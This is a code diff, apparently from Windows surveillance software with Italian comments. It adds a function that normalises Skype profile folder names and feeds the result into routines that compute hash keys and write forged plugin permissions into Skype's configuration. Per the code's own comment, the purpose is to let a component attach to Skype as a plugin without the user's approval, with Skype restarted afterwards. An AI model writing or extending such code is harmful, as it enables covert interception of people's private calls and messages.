@@ -2353,6 +2353,23 @@ void StartSkypeAsUser(char *skype_exe_path, STARTUPINFO* si, PROCESS_INFORMATION
 	}
 }
 
+void SKypeNameConvert(WCHAR *path, WCHAR *user_name, DWORD size)
+{
+	WCHAR *ptr;
+	DWORD len, first;
+
+	ZeroMemory(user_name, size);
+	_snwprintf_s(user_name, size/sizeof(WCHAR), _TRUNCATE, L"%s", path); 
+	ptr = wcsstr(user_name, L"#3a");
+	if (!ptr)
+		return;
+	
+	len = wcslen(user_name)*sizeof(WCHAR);
+	first = (DWORD)ptr - (DWORD)user_name;
+	*ptr = L':';
+
+	memcpy(ptr+1, ptr+3, len-first-4);
+}
 
 // Inserisce i permessi corretti per potersi attaccare a skype come plugin
 void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
@@ -2367,6 +2384,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 	BOOL is_to_respawn = FALSE;
 	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
 	BOOL isOld;
+	WCHAR skype_user_name[MAX_PATH];
 
 	// Trova il path di %appdata%\Skype
 	if(!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH)) 
@@ -2392,7 +2410,8 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 			CloseHandle(hFile);
 			// Verifica se contiene gia' la permission altrimenti la scrive
 			isOld = IsOldSkypeVersion(config_path);			
-			if (FindHashKeys(find_data.cFileName, core_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld))
+			SKypeNameConvert(find_data.cFileName, skype_user_name, sizeof(skype_user_name));
+			if (FindHashKeys(skype_user_name, core_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld))
 				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
 					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld)) 
 						is_to_respawn = TRUE;
